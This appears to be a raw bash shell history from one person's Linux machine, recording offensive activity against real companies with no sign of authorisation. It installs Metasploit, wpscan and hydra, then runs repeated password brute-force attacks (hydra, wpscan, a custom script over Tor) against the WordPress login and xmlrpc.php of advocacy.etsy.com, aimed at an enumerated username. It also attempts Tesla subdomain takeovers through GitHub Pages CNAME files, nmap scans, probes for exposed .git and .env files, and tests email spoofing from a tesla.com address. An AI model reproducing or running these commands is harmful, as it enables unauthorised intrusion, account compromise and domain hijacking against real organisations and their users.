cd
clear
ls
clear
history
clear
sudo apt update
sudo apt update && sudo apt upgrade -y
clear
wget https://portswigger.net/burp/releases/startdownload?product=community&version=2024.2.1&type=Linux -O burpsuite.sh
chmod +x burpsuite.sh
./burpsuite.sh
clea
clear
sudo apt install -y curl wget gnupg2 apt-transport-https software-properties-common
clear
curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfupdate.sh | bash
sudo apt update && sudo apt upgrade -y
curl https://apt.metasploit.com/metasploit-framework.gpg.key | sudo gpg --dearmor -o /usr/share/keyrings/metasploit-archive-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/metasploit-archive-keyring.gpg] http://apt.metasploit.com/ $(lsb_release -sc) main" | sudo tee /etc/apt/sources.list.d/metasploit-framework.list
sudo apt update
clear
curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/scripts/msf-install.sh | sudo bash
clear
snap install metasploit-framework
sudo systemctl start postgresql
clear
sudo apt update
clear
sudo apt update
clear
sudo apt update
sudo rm /etc/apt/sources.list.d/metasploit-framework.list
sudo apt update
clear
sudo systemctl start postgresql
clear
sudo apt update
clear
apt list --upgradable
sudo apt upgrade -y
sudo apt install -y postgresql postgresql-contrib
sudo systemctl start postgresql
msfdb init
clear
sudo adduser msfuser
sudo usermod -aG sudo msfuser
su - msfuser
clear
sudo snap install metasploit-framework --classic
sudo snap remove metasploit-framework
cleae
clear
sudo snap install metasploit-framework --classic
msfconsole
clear
wget -O usernames.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
wget -O passwords.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
clear
ls
tail -n 10 *.txt
clear
curl -s -L https://advocacy.etsy.com/wp-login.php | grep -E 'name="log"|name="pwd"|name="wp-submit"'
wpscan --url https://advocacy.etsy.com --enumerate u
apt install wpscan
clear
hydra -L usernames.txt -P passwords.txt advocacy.etsy.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username|Incorrect password"
apt install hydra
clear
hydra -L usernames.txt -P passwords.txt advocacy.etsy.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username|Incorrect password"
clear
msfconsole
clear
msfconsole
ls
clear
cd
clear
ls
mkdir wp_bruteforce
cd wp_bruteforce
nano wp_bruteforce.py
pwd
cd
mv passwords.txt /root/wp_bruteforce
clear
ls
cd wp_bruteforce
ls
pip install requests
apt install python3-pip
clear
pip install requests
cd
clear
sudo apt install python3-venv -y
python3 -m venv wp_venv
source wp_venv/bin/activate
clear
pip install requests
clear
ls
cd wp_bruteforce
python main.py
clear
python3 wp_bruteforce.py
clear
sudo apt install tor -y
sudo systemctl start tor
clear
curl -s -L -A "Mozilla/5.0" https://advocacy.etsy.com/wp-login.php
cd
wget https://advocacy.etsy.com/wp-login.php
clear
ls
cd wp_bruteforce
ls
rm -rf wp_bruteforce.py
clear
ls
nano wp_brutefoce.py
python wp_bruteforce.py
clear
ls
python wp_brutefoce.py
clear
cd
clear
curl -s https://advocacy.etsy.com/wp-login.php | grep "WordPress"
wafw00f https://advocacy.etsy.com
apt install wafw00f
systemctl restart networkd-dispatcher.service
clear
wpscan --url https://advocacy.etsy.com --enumerate vp
sudo apt update && sudo apt install -y git curl ruby ruby-dev build-essential libcurl4-openssl-dev libffi-dev libgmp-dev libreadline-dev zlib1g-dev
git clone https://github.com/wpscanteam/wpscan.git
cd wpscan
gem install bundler && bundle install
ruby wpscan.rb --help
wpscan --help
cd
pwd
sudo apt update && sudo apt install -y git ruby ruby-dev build-essential libcurl4-openssl-dev libffi-dev libgmp-dev libreadline-dev zlib1g-dev
wpscan --help
clear
sudo rm -rf ~/wpscan
sudo apt update && sudo apt install -y git ruby ruby-dev build-essential libcurl4-openssl-dev libffi-dev libgmp-dev libreadline-dev zlib1g-dev
wpscan --help
echo 'export PATH="$HOME/.local/share/gem/ruby/3.0.0/bin:$PATH"' >> ~/.bashrc
source ~/.bashrc
wpscan --version
vlear
clear
sudo gem install wpscan
wpscan --version
wpscan -h
clear
wpscan --url https://advocacy.etsy.com
wpscan --url https://advocacy.etsy.com --enumerate u
wpscan --url https://advocacy.etsy.com --enumerate vp
wpscan --url https://advocacy.etsy.com --enumerate vt
wpscan --url https://advocacy.etsy.com -U usernames.txt -P passwords.txt --password-attack wp-login
clear
curl -s https://advocacy.etsy.com/wp-json/wp/v2/users | jq '.[].slug'
cd 
ls
cd tesla-subdomain-takeover-test
echo "sandbox-manager.courses.tesla.com" > CNAME
echo "<h1>Tesla Subdomain Takeover Test</h1>" > index.html
git add CNAME index.html
git commit -m "Attempt to claim Tesla subdomain"
git config --global user.name "basavarajnaik108"
git push origin main
nslookup sandbox-manager.courses.tesla.com
host sandbox-manager.courses.tesla.com
dig CNAME sandbox-manager.courses.tesla.com +short
cd
clear
host sandbox-manager.courses.tesla.com
dig sandbox-manager.courses.tesla.com +short
nslookup sandbox-manager.courses.tesla.com
curl -s "http://web.archive.org/cdx/search/cdx?url=*.sandbox-manager.courses.tesla.com/*&output=text"
echo "sandbox-manager.courses.tesla.com" > CNAME
echo "sandbox-studio.courses.tesla.com" >> CNAME
echo "api-account-master.tesla.com" >> CNAME
git add CNAME
git commit -m "Adding multiple subdomains for takeover attempt"
git push origin maincd
exit
clear
cd
clear
ls
cd wp_bruteforce
python wp_bruteforce.py
clear
cd
ls
source wp_venv/bin/activate
clear
cd wp_bruteforce
pythonwp_bruteforce.py
clear
ls
wp_brutefoce.py
clear
python wp_brutefoce.py
clea
clear
sudo service tor restart
pytho  wp_brutefoce.py
clear
python wp_bruteforce.py
clear
ls
python wp_brutefoce.py
clear
cd
clear
cd
deactivaye
deactivate
clear
curl -s https://advocacy.etsy.com/wp-json/wp/v2/users
wpscan --url https://advocacy.etsy.com --enumerate ap,at
clear
curl -s https://advocacy.etsy.com/wp-json/wp/v2/posts
curl -s https://advocacy.etsy.com/wp-json/wp/v2/comments
clear
wc -l curl -s https://advocacy.etsy.com/wp-json/wp/v2/posts
curl -s https://advocacy.etsy.com/wp-json/wp/v2/comments
clear
curl -s https://advocacy.etsy.com/wp-json/wp/v2/posts
curl -s https://advocacy.etsy.com/wp-json/wp/v2/comments |head -1
clear
curl -s https://advocacy.etsy.com/wp-json/wp/v2/posts | head -1
clea
clear
curl -s https://advocacy.etsy.com/wp-json/wp/v2/posts
curl -s https://advocacy.etsy.com/wp-json/wp/v2/comments
clear
curl -s https://advocacy.etsy.com/wp-json/wp/v2/users?context=edit
curl -X POST -d "log=aerickson&pwd=password123" https://advocacy.etsy.com/wp-login.php
curl -X POST -d "<?xml version='1.0'?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>aerickson</value></param><param><value>test</value></param></params></methodCall>" https://advocacy.etsy.com/xmlrpc.php
clear
curl -X POST --http1.1 -d "log=aerickson&pwd=password123" https://advocacy.etsy.com/wp-login.php
curl -X POST -H "User-Agent: Mozilla/5.0" -d "log=aerickson&pwd=password123" https://advocacy.etsy.com/wp-login.php
wpscan --url https://advocacy.etsy.com --enumerate u --brute-force --passwords passwords.txt
wpscan --help
clear
curl -X POST -H "User-Agent: Mozilla/5.0"      -H "Referer: https://advocacy.etsy.com/wp-login.php"      -H "Origin: https://advocacy.etsy.com"      -d "log=aerickson&pwd=password123"      --http1.1 --verbose      https://advocacy.etsy.com/wp-login.php
wpscan --url https://advocacy.etsy.com   -U aerickson -P passwords.txt   --password-attack wp-login
clear
pwd
ls
cd wp_bruteforce
ls
mv passwords.txt /root
ld
ls
clear
cd
ls
rm -rf wp_bruteforce
clear
ls
wpscan --url https://advocacy.etsy.com   -U aerickson -P passwords.txt   --password-attack wp-login
clear
wpscan --url https://advocacy.etsy.com   -U aerickson -P passwords.txt   --password-attack wp-login --disable-tls-checks --http-version 1.1
wpscan --url https://advocacy.etsy.com   -U aerickson -P passwords.txt   --password-attack xmlrpc
clear
curl -X POST -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"      -H "Referer: https://advocacy.etsy.com/wp-login.php"      -H "Origin: https://advocacy.etsy.com"      -d "log=aerickson&pwd=password123"      --http1.1 -v      https://advocacy.etsy.com/wp-login.php
hydra -L usernames.txt -P passwords.txt advocacy.etsy.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"
clear
curl -X POST -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"      -H "Referer: https://advocacy.etsy.com/wp-login.php"      -H "Origin: https://advocacy.etsy.com"      -d "log=USERNAME&pwd=VALID_PASSWORD"      --http1.1 -v      https://advocacy.etsy.com/wp-login.php
curl -s https://advocacy.etsy.com/wp-json/wp/v2/users
clear
hydra -L usernames.txt -P passwords.txt advocacy.etsy.com http-post-form "/xmlrpc.php:methodCall=<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>^USER^</value></param><param><value>^PASS^</value></param></params></methodCall>:Invalid"
clear
cd
clear
ls
clear
ls -lh
rm -rf wget-log snap 'startdownload?product=community'
clear
ls -lh
rm -rf passwords.txt usernames.txt wget-log snap 'startdownload?product=community'
clear
ls
ls -lh
clear
clear
curl -X GET "https://owner-api.teslamotors.com/api/1/vehicles"
clear
cd
clear
ip a
curl -X GET "https://owner-api.teslamotors.com/api/1/vehicles"
clear
curl -X GET "https://owner-api.teslamotors.com/api/1/vehicles"
curl -I https://www.google.com
clear
curl -X POST https://auth.tesla.com/oauth2/v3/token   -H "Content-Type: application/json"   -d '{
    "grant_type": "password",
    "client_id": "ownerapi",
    "email": "your-email@example.com",
    "password": "your-password"
  }'
clear
curl -X GET "https://auth.tesla.com/oauth2/v3/.well-known/openid-configuration"
clear
curl -X GET "https://owner-api.teslamotors.com/api/1/products"
for i in {1..10}; do curl -X GET "https://owner-api.teslamotors.com/api/1/vehicles"; done
curl -I "https://owner-api.teslamotors.com/api/1/vehicles"
clear
curl -X GET "https://owner-api.teslamotors.com/api/1/"
curl -X POST "https://owner-api.teslamotors.com/api/1/vehicles" -H "Content-Type: application/json"
curl -s "https://www.tesla.com" | grep -i "api_key"
curl -s "https://crt.sh/?q=tesla.com&output=json" | jq
clear
curl -X GET "https://owner-api.teslamotors.com/api/1/"
curl -X POST "https://owner-api.teslamotors.com/api/1/vehicles" -H "Content-Type: application/json"
curl -s "https://www.tesla.com" | grep -i "api_key"
curl -s "https://crt.sh/?q=tesla.com&output=json" | jq | head -3
clear
curl -s "https://crt.sh/?q=tesla.com&output=json" | jq -r '.[].name_value' | sort -u
clear
for sub in $(curl -s "https://crt.sh/?q=tesla.com&output=json" | jq -r '.[].name_value' | sort -u); do   host $sub | grep "has address" || echo "$sub might be vulnerable"; done
clear
for sub in sandbox-manager.courses.tesla.com sandbox-studio.courses.tesla.com api-account-master.tesla.com owner-api.eng.vn.cloud.tesla.com github.tesla.com vpn.tesla.com teslaquila.tesla.com; do   host $sub; done
nmap -p 80,443,8080,8443,22,21,3306 --open -Pn -iL <(echo -e "sandbox-manager.courses.tesla.com\nsandbox-studio.courses.tesla.com\napi-account-master.tesla.com\nfleet-api.prd.na.vn.cloud.tesla.com")
apt install nmap
clear
for sub in sandbox-manager.courses.tesla.com sandbox-studio.courses.tesla.com api-account-master.tesla.com owner-api.eng.vn.cloud.tesla.com github.tesla.com vpn.tesla.com teslaquila.tesla.com; do   host $sub; done
nmap -p 80,443,8080,8443,22,21,3306 --open -Pn -iL <(echo -e "sandbox-manager.courses.tesla.com\nsandbox-studio.courses.tesla.com\napi-account-master.tesla.com\nfleet-api.prd.na.vn.cloud.tesla.com")
curl -I "https://sandbox-manager.courses.tesla.com/.git"
curl -I "https://sandbox-studio.courses.tesla.com/.env"
curl -I "https://fleet-api.prd.na.vn.cloud.tesla.com/.git/config"
curl -L -I "https://github.tesla.com"
curl -L -I "https://vpn.tesla.com"
curl -L -I "https://teslaquila.tesla.com"
for sub in sandbox-manager.courses.tesla.com sandbox-studio.courses.tesla.com api-account-master.tesla.com; do   curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" "https://$sub/"; done
clear
curl -s "https://securitytrails.com/list/apex_domain/tesla.com" | grep -iE "sandbox-manager|sandbox-studio|api-account-master|vpn|teslaquila"
curl -s "https://securitytrails.com/list/apex_domain/tesla.com" | grep "github.tesla.com\|vpn.tesla.com\|teslaquila.tesla.com"
cd
clear
nslookup -q=TXT _dmarc.tesla.com
dig TXT tesla.com +short
host sandbox-manager.courses.tesla.com
host sandbox-studio.courses.tesla.com
host api-account-master.tesla.com
clear
curl -s "http://web.archive.org/cdx/search/cdx?url=*.sandbox-manager.courses.tesla.com/*&output=text"
nslookup -q=TXT u13494342.wl093.sendgrid.net
curl -X POST "https://api.sendgrid.com/v3/mail/send"      -H "Authorization: Bearer YOUR-TEST-SENDGRID-API-KEY"      -H "Content-Type: application/json"      -d '{
        "personalizations": [{"to": [{"email": "your-email@example.com"}]}],
        "from": {"email": "test@tesla.com"},
        "subject": "Tesla SPF Test",
        "content": [{"type": "text/plain", "value": "Testing SPF email security"}]
      }'
clear
for sub in sandbox-manager.courses.tesla.com sandbox-studio.courses.tesla.com api-account-master.tesla.com; do     host $sub;     dig CNAME $sub +short; done
echo "sandbox-manager.courses.tesla.com" > CNAME
git init
git add CNAME
git commit -m "Attempt to claim Tesla subdomain"
git push origin main
aws s3 ls s3://sandbox-manager.courses.tesla.com
clear
git branch -m main
git remote add origin https://github.com/YOUR_GITHUB_USERNAME/YOUR_REPO.git
git push -u origin main
https://sandbox-manager.courses.tesla.com
apt update && apt install awscli -y
clear
cd
git clone https://github.com/basavarajnaik108/tesla-subdomain-takeover-test.git
cd tesla-subdomain-takeover-test
echo "sandbox-manager.courses.tesla.com" > CNAME
echo "<h1>Tesla Subdomain Takeover Test</h1>" > index.html
git add CNAME index.html
git commit -m "Attempt to claim Tesla subdomain"
git push origin main
clear
echo "sandbox-manager.courses.tesla.com" > CNAME
echo "<h1>Tesla Subdomain Takeover Test</h1>" > index.html
git add CNAME index.html
git commit -m "Attempt to claim Tesla subdomain"
git push origin main
https://sandbox-manager.courses.tesla.com
clea
clear
echo "sandbox-manager.courses.tesla.com" > CNAME
echo "<h1>Tesla Subdomain Takeover Test</h1>" > index.html
git add CNAME index.html
git commit -m "Attempt to claim Tesla subdomain"
git push origin main
https://basavarajnaik108.github.io/tesla-subdomain-takeover-test/
